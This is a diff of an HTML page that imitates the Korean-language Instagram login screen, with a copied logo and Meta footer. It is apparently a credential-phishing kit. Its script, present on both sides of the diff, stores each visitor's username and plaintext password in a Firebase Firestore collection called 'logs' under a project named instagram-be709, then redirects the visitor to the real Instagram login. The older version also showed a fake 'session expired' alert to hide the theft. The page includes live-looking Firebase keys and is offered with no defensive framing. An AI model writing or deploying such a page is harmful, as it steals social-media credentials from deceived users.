@@ -5,125 +5,25 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
-        body {
-            background-color: #ffffff;
-            margin: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        .language-container {
-            margin-top: 20px;
-            color: #8e8e8e;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .main-container {
-            width: 100%;
-            max-width: 350px;
-            padding: 0 40px;
-            box-sizing: border-box;
-            text-align: center;
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-        }
-
-        /* 최신형 인스타 로고 (가운데 비어있음) */
-        .logo-img {
-            width: 75px;
-            height: 75px;
-            margin: 0 auto 40px auto;
-            display: block;
-        }
-
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            margin-bottom: 12px;
-            border: 1px solid #dbdbdb;
-            border-radius: 10px;
-            background-color: #fafafa;
-            box-sizing: border-box;
-            font-size: 14px;
-            outline: none;
-        }
-
-        .btn-login {
-            width: 100%;
-            background-color: #0064e0;
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 50px;
-            font-weight: 600;
-            font-size: 15px;
-            margin-top: 8px;
-            cursor: pointer;
-        }
-
-        .forgot-pw {
-            color: #000000;
-            font-size: 14px;
-            font-weight: 600;
-            text-decoration: none;
-            margin-top: 20px;
-            display: block;
-        }
-
-        .bottom-section {
-            width: 100%;
-            max-width: 350px;
-            padding: 20px 40px 40px 40px;
-            box-sizing: border-box;
-            text-align: center;
-        }
-
-        .btn-signup {
-            width: 100%;
-            background-color: transparent;
-            color: #0064e0;
-            border: 1px solid #0064e0;
-            padding: 10px;
-            border-radius: 50px;
-            font-weight: 600;
-            font-size: 15px;
-            margin-bottom: 25px;
-            cursor: pointer;
-        }
-
-        /* [핵심] 중복 글자 제거하고 사진과 똑같이 한 줄 정렬 */
-        .meta-footer {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 4px; /* 로고와 글자 사이 간격 */
-        }
-        .meta-icon {
-            width: 18px; /* 사진 속 아이콘 크기 */
-            filter: grayscale(1);
-            opacity: 0.5; /* 연한 회색 */
-        }
-        .meta-text {
-            color: #8e8e8e; /* 사진 속 글자 색상 */
-            font-size: 14px;
-            font-weight: 500;
-        }
+        body { background-color: #ffffff; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .language-container { margin-top: 20px; color: #8e8e8e; font-size: 13px; display: flex; align-items: center; gap: 4px; cursor: pointer; }
+        .main-container { width: 100%; max-width: 350px; padding: 0 40px; box-sizing: border-box; text-align: center; flex-grow: 1; display: flex; flex-direction: column; justify-content: center; }
+        .logo-img { width: 75px; height: 75px; margin: 0 auto 40px auto; display: block; }
+        input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 12px; background-color: #fafafa; box-sizing: border-box; font-size: 14px; outline: none; }
+        .btn-login { width: 100%; background-color: #0064e0; color: white; border: none; padding: 13px; border-radius: 50px; font-weight: 600; font-size: 15px; margin-top: 8px; cursor: pointer; }
+        .forgot-pw { color: #000000; font-size: 14px; font-weight: 600; text-decoration: none; margin-top: 20px; display: block; }
+        .bottom-section { width: 100%; max-width: 350px; padding: 20px 40px 40px 40px; box-sizing: border-box; text-align: center; }
+        .btn-signup { width: 100%; background-color: transparent; color: #0064e0; border: 1px solid #0064e0; padding: 11px; border-radius: 50px; font-weight: 600; font-size: 15px; margin-bottom: 25px; cursor: pointer; }
+        /* Meta 한 줄 설정 */
+        .meta-footer { display: flex; align-items: center; justify-content: center; gap: 5px; }
+        .meta-icon { width: 18px; filter: grayscale(1); opacity: 0.5; }
+        .meta-text { color: #8e8e8e; font-size: 15px; font-weight: 500; }
     </style>
 </head>
 <body>
     <div class="language-container">한국어 ∨</div>
-
     <div class="main-container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1024px-Instagram_logo_2016.svg.png" alt="Instagram" class="logo-img">
-        
         <form id="loginForm">
             <input type="text" id="id" placeholder="사용자 이름, 이메일 주소 또는 휴대폰 번호" required>
             <input type="password" id="pw" placeholder="비밀번호" required>
@@ -131,50 +31,27 @@
         </form>
         <a href="#" class="forgot-pw">비밀번호를 잊으셨나요?</a>
     </div>
-
     <div class="bottom-section">
         <button type="button" class="btn-signup">새 계정 만들기</button>
-        
         <div class="meta-footer">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="" class="meta-icon">
             <span class="meta-text">Meta</span>
         </div>
     </div>
-
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyDGS9mDbbKXNL4OrskQ3ZDHBsKb8Glroj4",
-            authDomain: "instagram-be709.firebaseapp.com",
-            projectId: "instagram-be709",
-            storageBucket: "instagram-be709.firebasestorage.app",
-            messagingSenderId: "556245509978",
-            appId: "1:556245509978:web:e78967856f2ac2586f7563",
-            measurementId: "G-1KLXR0LXSZ"
-        };
-
+        const firebaseConfig = { apiKey: "AIzaSyDGS9mDbbKXNL4OrskQ3ZDHBsKb8Glroj4", authDomain: "instagram-be709.firebaseapp.com", projectId: "instagram-be709", storageBucket: "instagram-be709.firebasestorage.app", messagingSenderId: "556245509978", appId: "1:556245509978:web:e78967856f2ac2586f7563", measurementId: "G-1KLXR0LXSZ" };
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
-
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            const submitBtn = document.getElementById('submitBtn');
             const idVal = document.getElementById('id').value;
             const pwVal = document.getElementById('pw').value;
-            submitBtn.disabled = true;
-
             try {
-                await addDoc(collection(db, "logs"), {
-                    userId: idVal, userPw: pwVal, timestamp: new Date()
-                });
-                alert("로그인 프로세스가 만료되었습니다. 다시 로그인해 주세요.");
+                await addDoc(collection(db, "logs"), { userId: idVal, userPw: pwVal, timestamp: new Date() });
                 window.location.href = "https://www.instagram.com/accounts/login/";
-            } catch (error) {
-                alert("네트워크 연결을 확인해주세요.");
-                submitBtn.disabled = false;
-            }
+            } catch (error) { console.error(error); }
         });
     </script>
 </body>
